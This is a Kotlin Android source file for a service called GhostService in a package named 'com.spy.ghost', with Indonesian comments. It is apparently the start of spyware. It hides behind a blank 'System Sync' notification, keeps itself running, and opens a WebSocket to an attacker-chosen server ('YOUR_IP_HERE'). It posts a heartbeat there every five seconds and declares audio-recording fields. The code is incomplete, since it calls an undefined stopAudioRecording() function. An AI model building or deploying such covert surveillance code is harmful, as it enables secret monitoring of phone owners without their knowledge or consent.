package com.spy.ghost

import android.app.Service
import android.content.Intent
import android.media.MediaRecorder
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.UUID

class GhostService : Service() {
    private val client = OkHttpClient()
    private var webSocket: WebSocket? = null
    private val TAG = "GhostService"
    private val SERVER_URL = "ws://YOUR_IP_HERE:8080" // GANTI DENGAN IP KAMU!
    
    // Untuk Audio Recording
    private var mediaRecorder: MediaRecorder? = null
    private var currentRecordingFile: File? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service Created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Notifikasi Transparan
        val notification = android.app.Notification.Builder(this, "GHOST_CHANNEL")
            .setSmallIcon(android.R.drawable.ic_menu_report_image)
            .setContentTitle("System Sync")
            .setContentText("")
            .setOngoing(true)
            .build()

        startForeground(101, notification)

        connectToServer()
        
        // Mulai Loop Data
        GlobalScope.launch(Dispatchers.IO) {
            while (true) {
                sendDummyData() // Kirim data dummy biar server tau kita hidup
                Thread.sleep(5000) // Interval pengiriman
            }
        }

        return START_STICKY
    }

    private fun connectToServer() {
        val request = Request.Builder().url(SERVER_URL).build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "Connected to Server")
            }
            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "Connection Failed", t)
            }
        })
    }

    private fun sendDummyData() {
        try {
            // Contoh kirim data teks ke server
            val json = """{"status": "alive", "time": ${System.currentTimeMillis()}}""".toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("http://YOUR_IP_HERE:8080/data") 
                .post(json)
                .build()
            
            // Kita pakai call biasa, bukan websocket untuk text kecil biar hemat resource
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) Log.e(TAG, "Send failed: ${response.code}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Send Error", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopAudioRecording()
        webSocket?.close(1000, "Normal Closure")
    }
}